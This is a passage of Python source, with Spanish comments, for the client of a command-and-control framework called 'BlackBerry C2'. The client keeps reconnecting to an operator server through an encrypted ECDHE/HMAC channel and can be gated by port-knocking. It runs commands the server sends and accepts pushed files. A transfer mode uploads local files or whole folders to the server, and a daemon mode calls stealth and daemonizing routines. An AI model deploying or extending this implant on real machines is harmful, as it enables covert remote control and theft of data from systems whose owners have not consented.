      python BlackBerryC2_server.py --berrytransfer [--transfer-root <dir>] [--auto-confirm]
    """
    print("=" * 62)
    print("  \U0001fad0 BerryTransfer \u2014 modo sbt sobre BlackBerry C2")
    print("=" * 62)
    print(f"  Host : {SERVER_HOST}:{SERVER_PORT}")
    print(f"  HMAC : {'Configurado' if HMAC_PRE_SHARED_SECRET else 'Default'}")
    print("=" * 62)
    print()

    if SPA_ENABLED:
        if not do_spa_before_connect(SERVER_HOST, HMAC_PRE_SHARED_SECRET):
            print("[!] SPA/knock falló. Abortando.")
            return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20)

    try:
        print(f"[*] Conectando a {SERVER_HOST}:{SERVER_PORT}…")
        s.connect((SERVER_HOST, SERVER_PORT))
        s.settimeout(None)

        print("[*] Handshake ECDHE+HMAC…")
        aes_key = _do_ecdh_handshake(s)
        print("[+] Canal seguro: AES-256-GCM + Perfect Forward Secrecy")
        print()

        # ── Negociación de modo BerryTransfer ────────────────────────────
        send_encrypted_message(s, "BERRY_TRANSFER_MODE", aes_key)
        _, resp = receive_encrypted_message(s, aes_key, timeout=15)

        if resp == "BERRY_TRANSFER_DENIED":
            print("[!] El servidor rechazó el modo BerryTransfer.")
            print("    Inicia el servidor con --berrytransfer")
            return
        elif resp != "BERRY_TRANSFER_READY":
            print(f"[-] Respuesta inesperada del servidor: {resp!r}")
            return

        print("[+] Servidor listo en modo BerryTransfer\n")

        # ── Operación ────────────────────────────────────────────────────
        if bt_put is not None:
            # Auto-detecta archivo o carpeta
            if os.path.isfile(bt_put):
                bt_upload_file(s, aes_key, bt_put)
            elif os.path.isdir(bt_put):
                bt_upload_directory(s, aes_key, bt_put)
            else:
                print(f"[!] No existe o no es accesible: {bt_put}")

        elif bt_get is not None:
            # Descarga — el servidor confirmará si no está en auto-confirm
            print(f"[*] Solicitando al servidor: {bt_get}")
            print(f"    (El servidor debe confirmar la descarga si no está en --auto-confirm)\n")
            bt_download_file(s, aes_key, bt_get, bt_dest)

        elif bt_ls is not None:
            bt_list_remote(s, aes_key, bt_ls or ".")

        # ── Despedida ────────────────────────────────────────────────────
        send_encrypted_message(s, "BT:BYE", aes_key)

    except KeyboardInterrupt:
        print("\n\n  \033[93m[↩] Ctrl+C — cerrando sesión BerryTransfer…\033[0m")
        try:
            send_encrypted_message(s, "BT:BYE", aes_key)
        except Exception:
            pass
    except ConnectionRefusedError:
        print(f"[!] Conexión rechazada — ¿servidor corriendo en {SERVER_HOST}:{SERVER_PORT}?")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        try:
            s.close()
        except Exception:
            pass
        print("  \033[90m[*] Conexión cerrada.\033[0m\n")

# ==================== FIN BERRYTRANSFER ====================


def heartbeat_sender(sock, aes_key, stop_evt):
    while not stop_evt.is_set():
        if not send_encrypted_message(sock, "HEARTBEAT", aes_key):
            break
        stop_evt.wait(HEARTBEAT_INTERVAL)

def run_client():
    _exit = threading.Event()

    def _sigint_handler(sig, frame):
        if not _exit.is_set():
            print("\n\033[93m[↩] Ctrl+C — cerrando cliente BlackBerry C2…\033[0m")
            _exit.set()

    signal.signal(signal.SIGINT, _sigint_handler)
    signal.signal(signal.SIGTERM, _sigint_handler)

    while not _exit.is_set():
        s = None
        stop_evt = threading.Event()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            
            if not DAEMON_MODE:
                print(f"[*] Conectando a {SERVER_HOST}:{SERVER_PORT}...")

            # ── SPA / Port-knocking ───────────────────────────────────────────
            if SPA_ENABLED:
                if not do_spa_before_connect(SERVER_HOST, HMAC_PRE_SHARED_SECRET):
                    if not DAEMON_MODE:
                        print(f"[!] SPA falló, reintentando en {RECONNECT_DELAY}s...")
                    s.close()
                    time.sleep(RECONNECT_DELAY)
                    continue
            # ─────────────────────────────────────────────────────────────────
            
            s.connect((SERVER_HOST, SERVER_PORT))
            
            banner = s.recv(1024)
            if not DAEMON_MODE:
                print(f"[*] Banner recibido: {banner.decode('utf-8', 'ignore').strip()}")
            
            s.sendall(b"REQUEST_PUBKEY")
            
            # Recibir clave ECDH pública del servidor
            pem_data = b''
            while b'-----END PUBLIC KEY-----' not in pem_data:
                chunk = s.recv(PUBKEY_READ_LIMIT)
                if not chunk:
                    raise ValueError("Conexión perdida durante key exchange")
                pem_data += chunk
            
            if not pem_data.startswith(b'ECDH_PUBKEY:'):
                raise ValueError("Respuesta inválida del servidor")
            
            server_ecdh_pub_pem = pem_data[len(b'ECDH_PUBKEY:'):]
            server_ecdh_pub = serialization.load_pem_public_key(server_ecdh_pub_pem)
            
            # Verificar fingerprint ECDHE si está habilitado
            if VERIFY_FINGERPRINT:
                server_fingerprint = get_ecdhe_fingerprint(server_ecdh_pub_pem)
                if not DAEMON_MODE:
                    print(f"[*] Fingerprint servidor ECDHE: {server_fingerprint}")
                
                if server_fingerprint.lower() != EXPECTED_FINGERPRINT.lower():
                    if not DAEMON_MODE:
                        print("[!] Fingerprint ECDHE no coincide. Abortando.")
                    raise ValueError("Fingerprint ECDHE no coincide")
                
                if not DAEMON_MODE:
                    print("[+] Fingerprint ECDHE verificado correctamente")
            
            # Generar par ECDH efímero del cliente
            client_ecdh_private = ec.generate_private_key(ec.SECP256R1())
            client_ecdh_public_pem = client_ecdh_private.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            if not DAEMON_MODE:
                print("[*] Generando par ECDHE efímero del cliente...")
            
            # Calcular secreto compartido ECDH
            shared_secret = client_ecdh_private.exchange(ec.ECDH(), server_ecdh_pub)
            
            # Derivar clave AES-256 con HKDF
            aes_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'BlackBerryC2_AES_KEY',
            ).derive(shared_secret)
            
            if not DAEMON_MODE:
                print("[*] Secreto compartido calculado via ECDHE")
                print("[*] Clave AES-256 derivada con HKDF")
            
            # Calcular HMAC de autenticación
            hmac_tag = hmac_module.new(
                HMAC_PRE_SHARED_SECRET, shared_secret, hashlib.sha256
            ).digest()
            
            if not DAEMON_MODE:
                print("[*] HMAC de autenticación generado")
            
            # Enviar clave pública ECDH del cliente + HMAC
            s.sendall(struct.pack('!I', len(client_ecdh_public_pem)) + client_ecdh_public_pem)
            s.sendall(hmac_tag)
            
            if not DAEMON_MODE:
                print("[+] Autenticación completada exitosamente")
                print("[+] Canal seguro establecido (AES-256-GCM + Perfect Forward Secrecy)")
                print()
            
            hb_thread = threading.Thread(
                target=heartbeat_sender,
                args=(s, aes_key, stop_evt),
                daemon=True
            )
            hb_thread.start()
            
            while True:
                _, msg_str = receive_encrypted_message(s, aes_key, timeout=(HEARTBEAT_INTERVAL + 10))
                if msg_str is None:
                    break
                
                if msg_str.startswith("SIZE "):
                    handle_incoming_file(msg_str, s, aes_key)
                elif msg_str != "HEARTBEAT_ACK":
                    process_command_and_respond(msg_str, s, aes_key)
        
        except KeyboardInterrupt:
            _exit.set()
        except Exception as e:
            if not DAEMON_MODE:
                print(f"[!] Error: {e}")
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass
            stop_evt.set()
            if _exit.is_set():
                if not DAEMON_MODE:
                    print("\033[90m[*] Cliente detenido.\033[0m")
                break
            if not DAEMON_MODE:
                print(f"[*] Reconectando en {RECONNECT_DELAY} segundos...")
            # Espera interrumpible: despertamos antes si llega Ctrl+C
            _exit.wait(timeout=RECONNECT_DELAY)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='BlackBerry Client TCP')
    parser.add_argument('-H', '--host', type=str, default=SERVER_HOST, 
                        help='Host del servidor', dest='host')
    parser.add_argument('-p', '--port', type=int, default=SERVER_PORT, 
                        help='Puerto del servidor')
    parser.add_argument('--hmac', type=str, default='false', 
                        help='Secreto HMAC (false o clave secreta)')
    parser.add_argument('--fingerprint', type=str, default='false', 
                        help='Fingerprint ECDHE esperado (false o fingerprint)')
    parser.add_argument('--daemon', action='store_true', 
                        help='Ejecutar como daemon en segundo plano')

    # ── SPA / Port-knocking ───────────────────────────────────────────────────
    parser.add_argument('--spa', action='store_true',
                        help='Activar SPA antes de conectar (modo "spa" por defecto)')
    parser.add_argument('--spa-mode', type=str, default='spa', dest='spa_mode',
                        choices=['spa', 'knock'],
                        help='"spa" = un paquete UDP firmado  |  "knock" = secuencia de puertos')
    parser.add_argument('--spa-port', type=int, default=7331, dest='spa_port',
                        help='Puerto UDP para SPA (debe coincidir con el servidor, default: 7331)')
    parser.add_argument('--knock-seq', type=str, default='7001,7002,7003', dest='knock_seq',
                        help='Secuencia de puertos UDP para knock (default: 7001,7002,7003)')
    parser.add_argument('--knock-delay', type=float, default=0.3, dest='knock_delay',
                        help='Segundos entre golpes knock (default: 0.3)')
    parser.add_argument('--spa-wait', type=float, default=1.0, dest='spa_wait',
                        help='Segundos de espera tras SPA antes de conectar TCP (default: 1.0)')

    # ── BerryTransfer ─────────────────────────────────────────────────────────
    parser.add_argument('--sbt', action='store_true', dest='berrytransfer',
                        help='Activar modo BerryTransfer (sbt sobre BlackBerry C2). '
                             'Requiere --berrytransfer en el servidor.')
    parser.add_argument('--put', type=str, default=None, dest='bt_put',
                        help='[BerryTransfer] Ruta local de archivo o carpeta a SUBIR al servidor '
                             '(auto-detecta si es archivo o directorio)')
    parser.add_argument('--get', type=str, default=None, dest='bt_get',
                        help='[BerryTransfer] Nombre de archivo a DESCARGAR del servidor '
                             '(el servidor debe confirmar o estar en modo --auto-confirm)')
    parser.add_argument('--ls', type=str, default=None, const='.', nargs='?',
                        dest='bt_ls',
                        help='[BerryTransfer] Listar archivos disponibles en el servidor '
                             '(sin argumento = raíz)')
    parser.add_argument('--dest', type=str, default=None, dest='bt_dest',
                        help='[BerryTransfer] Nombre/ruta de destino local (opcional, para --get)')
    # ─────────────────────────────────────────────────────────────────────────

    args = parser.parse_args()
    
    SERVER_HOST = args.host
    SERVER_PORT = args.port
    
    # Configurar HMAC secret
    # El servidor genera un token hex de 12 chars; convertirlo a bytes desde hex
    if args.hmac != 'false':
        secret = args.hmac.strip()
        try:
            # Intentar decodificar como hex (formato del servidor: 12 chars hex)
            HMAC_PRE_SHARED_SECRET = bytes.fromhex(secret)
        except ValueError:
            # Si no es hex válido, usar como string literal (compatibilidad)
            HMAC_PRE_SHARED_SECRET = secret.encode('utf-8')
    
    # Configurar fingerprint
    if args.fingerprint != 'false':
        VERIFY_FINGERPRINT = True
        EXPECTED_FINGERPRINT = args.fingerprint
    
    # Configurar modo daemon
    DAEMON_MODE = args.daemon

    # ── SPA / Knock ──────────────────────────────────────────────────────────
    SPA_ENABLED = args.spa
    SPA_MODE    = args.spa_mode
    SPA_UDP_PORT = args.spa_port
    KNOCK_DELAY  = args.knock_delay
    try:
        KNOCK_SEQUENCE = [int(p.strip()) for p in args.knock_seq.split(',') if p.strip()]
        if not KNOCK_SEQUENCE:
            raise ValueError
    except ValueError:
        print("[!] --knock-seq inválido. Formato: 7001,7002,7003")
        sys.exit(1)

    # Función auxiliar necesita el wait configurable; la sobreescribimos parcialmente
    _orig_do_spa = do_spa_before_connect
    def do_spa_before_connect(server_ip, hmac_secret, wait_after=args.spa_wait):
        return _orig_do_spa(server_ip, hmac_secret, wait_after)
    # ─────────────────────────────────────────────────────────────────────────

    if DAEMON_MODE:
        if os.name == 'posix':
            daemonize()
        enable_stealth()
    elif args.berrytransfer:
        # ── Modo BerryTransfer ────────────────────────────────────────────────
        ops = [args.bt_put, args.bt_get, args.bt_ls]
        if not any(x is not None for x in ops):
            print("[!] BerryTransfer: debes especificar una operación:")
            print("      --put <archivo|carpeta>   →  subir al servidor")
            print("      --get <nombre_archivo>    →  descargar del servidor (requiere confirmación)")
            print("      --ls [<ruta>]             →  listar archivos disponibles")
            sys.exit(1)
        run_transfer_client(
            bt_put=args.bt_put,
            bt_get=args.bt_get,
            bt_dest=args.bt_dest,
            bt_ls=args.bt_ls,
        )
        sys.exit(0)
        # ─────────────────────────────────────────────────────────────────────
    else:
        print("=" * 60)
        print("BlackBerry C2 Client - TCP")
        print("=" * 60)
        print(f"Host: {SERVER_HOST}")
        print(f"Port: {SERVER_PORT}")
        print(f"HMAC: {'Configurado' if args.hmac != 'false' else 'Default'}")
        print(f"Fingerprint ECDHE: {'Verificación habilitada' if VERIFY_FINGERPRINT else 'No verificar'}")
        print(f"Modo: Interactivo (--daemon para segundo plano)")
        if SPA_ENABLED:
            if SPA_MODE == 'knock':
                print(f"SPA:  Knock  → secuencia {KNOCK_SEQUENCE}  delay={KNOCK_DELAY}s")
            else:
                print(f"SPA:  Token HMAC  → UDP:{SPA_UDP_PORT}  wait={args.spa_wait}s")
        print("=" * 60)
        print()
    
    run_client()